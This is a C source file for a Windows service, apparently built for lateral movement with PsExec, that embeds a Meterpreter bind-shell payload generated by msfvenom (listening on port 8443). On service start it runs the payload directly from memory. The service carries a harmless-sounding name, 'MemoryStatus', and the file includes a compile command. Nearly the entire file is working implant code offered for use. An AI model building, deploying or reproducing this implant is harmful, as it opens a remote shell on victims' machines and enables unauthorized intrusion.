// compile:
// wine gcc -m32 psexecservice.c

#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000
#define LOGFILE "C:\\status.txt"

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void  ServiceMain(int argc, char** argv); 
void  ControlHandler(DWORD request); 
int InitService();

// some shellcode
//# msfvenom -p windows/meterpreter/bind_tcp lport=8443 -f c -a x86 --platform Windows
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a"
"\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x20\xfb\x89"
"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
"\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
"\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04"
"\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b"
"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
"\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3";


void exec_shellcode(unsigned char *shellcode)
{
  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}

int WriteToLog(char* str)
{
	FILE* log;
	log = fopen(LOGFILE, "a+");
	if (log == NULL)
		return -1;
	fprintf(log, "%s\n", str);
	fclose(log);
	return 0;
}

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MemoryStatus";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    // Start the control dispatcher thread for our service
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}


void ServiceMain(int argc, char** argv) 
{ 
    int error; 
 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler(
		"SomeService", 
		(LPHANDLER_FUNCTION)ControlHandler); 
    if (hStatus == (SERVICE_STATUS_HANDLE)0) 
    { 
        // Registering Control Handler failed
        return; 
    }  
    // Initialize Service 
    error = InitService(); 
    if (error) 
    {
		// Initialization failed
        ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
        ServiceStatus.dwWin32ExitCode      = -1; 
        SetServiceStatus(hStatus, &ServiceStatus); 
        return; 
    } 
    // We report the running status to SCM. 
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
    
    WriteToLog("start shellcode\n");	
    exec_shellcode(buf);
    WriteToLog("shellcode executed\n");	
    
    // The worker loop of a service
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
	{
		// do nothing
		Sleep(SLEEP_TIME);
	}
    return; 
}

 
// Service initialization
int InitService() 
{ 
    
    int result;
    result = WriteToLog("start service");
    return(result); 
} 

// Control handler function
void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
             //WriteToLog("Monitoring stopped.");

            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            WriteToLog("stop service");

            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
 
    // Report current status
    SetServiceStatus (hStatus,  &ServiceStatus);
 
    return; 
} 

